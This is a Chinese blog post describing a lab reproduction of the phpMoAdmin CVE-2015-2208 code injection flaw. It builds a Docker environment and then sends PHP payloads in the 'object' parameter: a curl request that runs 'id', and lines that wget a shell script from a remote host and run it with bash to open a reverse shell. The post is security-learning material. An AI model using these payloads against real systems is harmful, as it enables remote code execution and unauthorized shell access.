ailx10说：这篇是我2024年9月写的。phpMoAdmin 这个旧漏洞没在我当时刷的 Vulhub 环境里，所以先去找 Dockerfile，结果年代太久，还得改成使用本地压缩包，环境才搭起来。之后才轮到 object 参数里的 PHP 内容：先看命令输出，再做下载和执行。光是这段准备就值得记一笔，不然以后只看最后的请求，会以为复现从来不需要折腾依赖。它管的是 MongoDB，和名字相近的 phpMyAdmin 不是同一回事；把工具背景认对，后面的理解也少走弯路。

---

phpMoAdmin 是面向 MongoDB 的 Web 管理工具。本文记录历史版本中对象参数处理相关的实验，而非 MySQL 或 MariaDB 管理。

原样例涉及 PHP 代码，认证配置与请求中的凭据是否一致尚需核对；旧容器和代码未重新运行。

（1）下载 cve-2015-2208 的Docker环境

```
git clone https://github.com/ptantiku/cve-2015-2208.git
```

（2）修改 Dockerfile 为以下内容，要不然各种报错

```
FROM ubuntu:14.04

MAINTAINER ptantiku



RUN apt-get update

RUN apt-get upgrade -y 

RUN apt-get install -y wget unzip

RUN apt-get install -y apache2 libapache2-mod-php5 mongodb php5-mongo

RUN apt-get install -y openssh-server



# download phpmoadmin

WORKDIR /var/www/html

#RUN wget http://www.phpmoadmin.com/file/phpmoadmin.zip

#RUN unzip phpmoadmin.zip

COPY ./phpmoadmin1.1.2.zip /var/www/html/phpmoadmin1.1.2.zip

RUN unzip phpmoadmin1.1.2.zip



#enable login, scott/tiger

RUN sed -i -re 's%^//(\$accessControl.*)$%\1%g' moadmin.php



EXPOSE 22 80

#[optional] add vhost

#ADD my_vhost.conf /etc/apache2/sites-enabled/



#set default run command

ADD run.sh /run.sh

CMD ["/run.sh"]
```

（3）构建镜像

```
docker build -t myapp:latest .
```

（4）运行容器

```
docker run -d -p 8888:80 myapp:latest
```

（5）访问网址

```
http://144.34.162.13:8888/moadmin.php
```

![](/notes-assets/f5f70b7321bd07ac7016.webp)

（6）漏洞复现

可以通过命令行

```
curl "http://144.34.162.13:8888/moadmin.php" -d "object=1;system('id');exit"
```

![](/notes-assets/d730661c6b0d73aebca6.webp)

也可以通过浏览器

![](/notes-assets/fc9629329ae2abe8bb31.webp)

（7）下载并执行反弹shell的shell脚本（一条一条执行）

```
object=1;system('wget http://144.34.162.13/10.sh -O /tmp/10.sh');exit

object=1;system('bash /tmp/10.sh');exit
```

![](/notes-assets/4f617b99a71cd6c905be.webp)

（8）反弹shell成功

![](/notes-assets/42a8d139b7f9931d1e70.webp)

工具名称里有Admin，不代表这个入口天然具备正确的权限边界。把实际登录条件和参数行为留在实验旁边，才知道问题发生在什么范围。
